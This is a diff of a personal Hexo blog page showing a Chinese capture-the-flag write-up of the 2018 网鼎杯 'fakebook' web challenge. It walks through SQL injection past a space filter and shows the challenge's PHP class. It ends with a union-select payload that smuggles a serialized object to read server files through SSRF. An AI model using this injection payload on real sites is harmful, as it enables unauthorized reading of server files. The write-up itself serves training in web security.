@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   
   
-  <title>archive_a: 2021   | Hexo</title>
+  <title>网鼎杯2018   | Hexo</title>
 
   
     <link rel="apple-touch-icon" href="/images/favicon.png">
@@ -85,141 +85,107 @@
 
 
       <div class="flex-container">
-        <!-- 归档页，展示本站所有文章，按照年份降序归类，url形式：https://yoursite/archives/ -->
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
 
-<!-- last: 按年份把文章分组，当前遍历到的年份 -->
-<!-- now: 当前遍历到的文章的发布年份 -->
 
-<div class="container archives">
-  <div class="post-list">
-    
-    
-      
-        <!-- 第一篇文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2021</span>
-          </h2>
-        </div>
-      
-      <div class="post-item" title="2018">
-        <div class="time-m-d">01-03</div>
-        <div class="title">
-          <a href="/2021/01/03/2018/">
-            <span>2018</span>
-          </a>
-        </div>
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">网鼎杯2018</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-01-02
+        </span>
+        
       </div>
-    
-      
-      <div class="post-item" title="网鼎杯2018">
-        <div class="time-m-d">01-02</div>
-        <div class="title">
-          <a href="/2021/01/02/%E7%BD%91%E9%BC%8E%E6%9D%AF2018/">
-            <span>网鼎杯2018</span>
-          </a>
-        </div>
+      <div class="markdown-body">
+        <h1 id="网鼎杯-2018-web题-fakebook"><a href="#网鼎杯-2018-web题-fakebook" class="headerlink" title="网鼎杯 2018 web题 fakebook"></a>网鼎杯 2018 web题 fakebook</h1><p><img src="https://i.loli.net/2021/01/03/fsdrYZWDb4NTeuh.png" alt="首先看题目"><br>随便注册一个账号</p>
+<p><img src="https://i.loli.net/2021/01/03/d1c3VwsQrhOKzqD.png" alt="查看源码"><br>感觉是sql注入</p>
+<p><img src="https://i.loli.net/2021/01/03/Jo8WurMy7GUSp1x.png" alt="加个&#39;试一下报错"><br>确实是sql注入</p>
+<p><img src="https://i.loli.net/2021/01/03/b2S7483tiPqoFhC.png" alt="用orderby看一下列数"><br>有4列</p>
+<p><img src="https://i.loli.net/2021/01/03/ru9xsfOEVIn2D6G.png" alt="试一下select"></p>
+<p>发现好像没有成功，是不是把空格过滤了，换成++再试一下<br><img src="https://i.loli.net/2021/01/03/gMFxDB6suSVebom.png" alt="换成++成功了"></p>
+<p>开始sql注入的基本步骤<br><img src="https://i.loli.net/2021/01/03/w5oUpLNPJGWxtXA.png"></p>
+<p>去看一下data<br><img src="https://i.loli.net/2021/01/03/ElnyCGoxRvH29bi.png"></p>
+<p>最后得到的结果好像有点不一样<br><img src="https://i.loli.net/2021/01/03/JbLWSENzjCBl39H.png"></p>
+<p>查看robots.txt<br><img src="https://i.loli.net/2021/01/03/36vmxMgDeU1GKCI.png"></p>
+<p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看完有点懵逼，查询资料才知道是考ssrf漏洞</p>
+<p>利用SSRF漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=<span class="number">0</span>++union++select++<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/03/e6XaByfSor4wAG1.png"></p>
+<p>去看源码<br><img src="https://i.loli.net/2021/01/03/glVrRB6OeLi4jTf.png"></p>
+<blockquote>
+<p>得到flag！</p>
+</blockquote>
+
       </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/01/01/csaw-ctf-2016-quals/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-01-02
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/01/03/2018/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
     
-      
-      <div class="post-item" title="csaw-ctf-2016-quals">
-        <div class="time-m-d">01-01</div>
-        <div class="title">
-          <a href="/2021/01/01/csaw-ctf-2016-quals/">
-            <span>csaw-ctf-2016-quals</span>
-          </a>
-        </div>
-      </div>
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-web%E9%A2%98-fakebook"><span class="toc-text">网鼎杯 2018 web题 fakebook</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
     
-      
-        <!-- 后续文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2020</span>
-          </h2>
-        </div>
-      
-      <div class="post-item" title="TokyoWesterns">
-        <div class="time-m-d">12-27</div>
-        <div class="title">
-          <a href="/2020/12/27/TokyoWesterns/">
-            <span>TokyoWesterns</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="护网杯2018">
-        <div class="time-m-d">12-26</div>
-        <div class="title">
-          <a href="/2020/12/26/%E6%8A%A4%E7%BD%91%E6%9D%AF2018/">
-            <span>护网杯2018</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="xtctf">
-        <div class="time-m-d">12-24</div>
-        <div class="title">
-          <a href="/2020/12/24/xtctf/">
-            <span>xtctf</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="XCTF 4th-CyberEarth">
-        <div class="time-m-d">12-19</div>
-        <div class="title">
-          <a href="/2020/12/19/XCTF%204th-CyberEarth/">
-            <span>XCTF 4th-CyberEarth</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="强网杯 2019 web题">
-        <div class="time-m-d">12-18</div>
-        <div class="title">
-          <a href="/2020/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20web%E9%A2%98/">
-            <span>强网杯 2019 web题</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="攻防世界web高手区003">
-        <div class="time-m-d">12-17</div>
-        <div class="title">
-          <a href="/2020/12/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E5%8C%BA003/">
-            <span>攻防世界web高手区003</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="The first try">
-        <div class="time-m-d">12-17</div>
-        <div class="title">
-          <a href="/2020/12/17/The%20first%20try/">
-            <span>The first try</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="Hello World">
-        <div class="time-m-d">12-16</div>
-        <div class="title">
-          <a href="/2020/12/16/hello-world/">
-            <span>Hello World</span>
-          </a>
-        </div>
+      <div class="comments-container">
+        
+
+
+
+
+
       </div>
     
   </div>
-</div>
+
 
         <div class="footer">
   <div class="social">
